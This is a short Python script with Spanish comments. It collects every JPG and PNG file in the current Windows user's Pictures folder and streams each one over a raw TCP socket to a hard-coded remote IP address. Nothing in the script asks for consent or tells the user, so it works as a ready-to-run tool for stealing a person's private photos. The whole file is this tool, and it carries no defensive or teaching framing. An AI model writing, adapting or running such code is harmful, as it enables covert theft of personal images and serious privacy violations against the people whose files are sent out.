import socket
import os
import time

def enviar_archivos(ruta_base, servidor, puerto):
    # Lista para almacenar todas las rutas de las fotos encontradas
    fotos_encontradas = []

    # Recorrer todas las carpetas y subcarpetas dentro de la ruta base
    for ruta_actual, carpetas, archivos in os.walk(ruta_base):
        for archivo in archivos:
            if archivo.endswith(('.jpg', '.png')):
                # Construir la ruta completa del archivo
                ruta_archivo = os.path.join(ruta_actual, archivo)
                fotos_encontradas.append(ruta_archivo)

    # Crear un socket TCP/IP
    cliente_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Conectar el socket al servidor remoto
        cliente_socket.connect((servidor, puerto))

        for ruta_archivo in fotos_encontradas:
            # Obtener el nombre del archivo
            nombre_archivo = os.path.basename(ruta_archivo).encode()

            with open(ruta_archivo, "rb") as archivo:
                # Enviar el nombre del archivo
                cliente_socket.sendall(len(nombre_archivo).to_bytes(4, byteorder='big'))  # Enviar longitud del nombre
                cliente_socket.sendall(nombre_archivo)  # Enviar nombre del archivo

                # Enviar el contenido del archivo en bloques
                datos = archivo.read(1024)
                while datos:
                    cliente_socket.sendall(datos)
                    datos = archivo.read(1024)
                
                # Enviar mensaje especial indicando el final del archivo
                cliente_socket.sendall(b"EOF")

                print(f"Archivo {ruta_archivo} enviado.")
                
                # Esperar un segundo antes de enviar el siguiente archivo
                time.sleep(2)

    except Exception as e:
        print("Error:", e)
    finally:
        cliente_socket.close()

if __name__ == "__main__":
    user = os.environ['USERNAME']
    ruta_base = rf'C:\Users\{user}\Pictures'
    servidor = "18.215.162.79"
    puerto = 8080 # Debe ser el mismo puerto usado en el servidor
    enviar_archivos(ruta_base, servidor, puerto)
